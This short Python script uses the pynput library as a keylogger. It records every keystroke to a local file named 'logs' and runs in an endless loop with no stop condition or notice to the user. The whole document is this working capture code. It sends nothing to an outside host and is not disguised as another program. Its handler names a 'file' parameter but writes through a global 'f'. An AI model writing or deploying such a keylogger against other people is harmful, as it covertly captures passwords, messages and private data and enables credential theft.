from pynput import keyboard
import time


def on_press(key, file):
    if hasattr(key, 'char'):
        key = key.char
    to_write = f'{key}\n'
    f.write(to_write)



# ...or, in a non-blocking fashion:
with open('logs', 'a+') as f:
    listener = keyboard.Listener(on_press=lambda x: on_press(x, f))
    listener.start()
    while True:
        time.sleep(10)


